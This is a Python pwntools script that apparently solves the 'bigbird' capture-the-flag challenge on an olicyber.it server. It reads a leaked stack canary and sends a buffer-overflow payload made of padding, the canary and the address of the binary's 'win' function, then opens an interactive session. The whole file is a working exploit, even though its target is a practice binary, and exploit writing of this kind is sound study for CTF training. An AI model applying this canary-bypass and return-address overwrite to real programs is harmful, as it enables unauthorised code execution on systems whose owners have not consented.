from pwn import *

elf = ELF("bigbird")
r = remote("bigbird.challs.olicyber.it", 12006)
off = 40
with log.progress("Leaking canary") as l:
    r.recvuntil(b"BIRD: ")
    canary = int(r.recvline().strip(), 16)
    l.success(hex(canary))

with log.progress("Building payload") as l:
    payload = b"A" * off
    payload += p64(canary)
    payload += b"A" * 8
    payload += p64(elf.sym['win'])
    l.success()

r.sendline(payload)
r.interactive()
